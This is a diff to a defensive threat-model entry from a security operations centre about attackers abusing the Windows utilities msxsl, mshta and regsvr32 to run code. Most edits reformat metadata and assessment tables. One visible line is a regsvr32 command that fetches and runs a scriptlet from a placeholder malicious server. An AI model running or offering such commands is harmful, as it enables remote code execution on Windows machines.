@@ -1,14 +1,15 @@
 # Malicious Code Execution with Windows Utilities
 
 ## Metadata
-
-- **UUID**: `d5892ae6-d022-4ac8-858c-c2756067cdac`
-- **Schema**: `threat::1.0`
-- **Version**: `1`
-- **Created**: `2024-11-04`
-- **Modified**: `2024-11-04`
-- **TLP**: clear (`TLP:CLEAR`)
-- **Organisation**: EC DIGIT CSOC (`56b0a0f0-b0bc-47d9-bb46-02f80ae2065a`)
+| Field | Value |
+| --- | --- |
+| UUID | `d5892ae6-d022-4ac8-858c-c2756067cdac` |
+| Schema | `threat::1.0` |
+| Version | `1` |
+| Created | `2024-11-04` |
+| Modified | `2024-11-04` |
+| TLP | clear (`TLP:CLEAR`) |
+| Organisation | EC DIGIT CSOC (`56b0a0f0-b0bc-47d9-bb46-02f80ae2065a`) |
 
 ## Description
 ### 1. Msxsl.exe
@@ -47,21 +48,30 @@ regsvr32.exe /s /n /u /i:http://malicious-server/script.sct scrobj.dll
 **Medium** - A Medium priority incident may affect public health or safety, national security, economic security, foreign relations, civil liberties, or public confidence.
 
 ## Terrain
-> **Threat Actor must have the ability to execute code on a Windows system where the 
+Threat Actor must have the ability to execute code on a Windows system where the 
 specified utilities Msxsl.exe, Mshta.exe, and Regsvr32.exe are present. 
 This often requires initial access through phishing, exploitation of vulnerabilities, 
 or use of valid credentials.
 
-Domains: Enterprise
-Targets: Virtual Machines, Workstations, Laptop
-Platforms: Windows, Active Directory, PowerShell**
+## Surface
+> **Windows**
+> Microsoft Windows operating systems (all versions)
+
+> **Active Directory**
+> Microsoft Active Directory on-premises directory services
+
+> **Azure::Compute::Virtual Machines**
+> Azure Virtual Machines
+
+> **Windows::Desktop**
+> Microsoft Windows desktop editions
 
 ## Threat Assessment
 | Dimension | Assessment | Description |
 | --- | --- | --- |
 | Severity | Significant incident | A cyber attack which has a serious impact on a large organisation or on wider / local government, or which poses a considerable risk to central government or (inter)national essential services. |
-| Impact | Data Breach; Business disruption; Reputational Damages; Legal and regulatory | - |
-| Leverage | Elevation of privilege; Tampering; Spoofing | - |
+| Impact | Data Breach<br>Business disruption<br>Reputational Damages<br>Legal and regulatory | Non-public information has been accessed from the outside, and successfully extracted.<br>Business disruption<br>Damages to the organization public view may be achieved by using directly the access gained, or indirectly with data gathered.<br>Legal and regulatory costs |
+| Leverage | Elevation of privilege<br>Tampering<br>Spoofing | Capacity to augment leverage over the target system by upgrading the compromised access rights<br>Threat action intending to maliciously change or modify persistent data, such as records in a database, and the alteration of data in transit between two computers over an open network, such as the Internet.<br>Threat action aimed at accessing and use of another user’s credentials, such as username and password. |
 | Viability | Likely | Probable (probably) - 55-80% |
 | Kill Chain | Execution | Techniques that result in execution of attacker-controlled code on a local or remote system. |
 
@@ -84,12 +94,14 @@ Platforms: Windows, Active Directory, PowerShell**
 ## Chaining
 ```mermaid
 flowchart LR
-d5892ae6_d022_4ac8_858c_c2756067cdac["Malicious Code Execution with Windows Utilities"]
-d5039f2c_9fcc_4ba3_ad6a_da8c891ba745["Abuse of Windows Utilities"]
-d5892ae6_d022_4ac8_858c_c2756067cdac -->|atomicity::implements| d5039f2c_9fcc_4ba3_ad6a_da8c891ba745
+subgraph "Execution"
+d5892ae6_d022_4ac8_858c_c2756067cdac{{"Malicious Code Execution<br>with Windows Utilities"}}
+d5039f2c_9fcc_4ba3_ad6a_da8c891ba745{{"Abuse of Windows<br>Utilities"}}
+end
+d5892ae6_d022_4ac8_858c_c2756067cdac -->|implements| d5039f2c_9fcc_4ba3_ad6a_da8c891ba745
 ```
 ### Chaining details
-#### implements -> Abuse of Windows Utilities (`atomicity::implements`)
+#### implements -> [Abuse of Windows Utilities](abuse-of-windows-utilities.md) (`d5039f2c-9fcc-4ba3-ad6a-da8c891ba745`) (`atomicity::implements`)
 This TVM is implementing the bigger TVM : Abuse of Windows Utilities
 
 - **Target UUID**: `d5039f2c-9fcc-4ba3-ad6a-da8c891ba745`
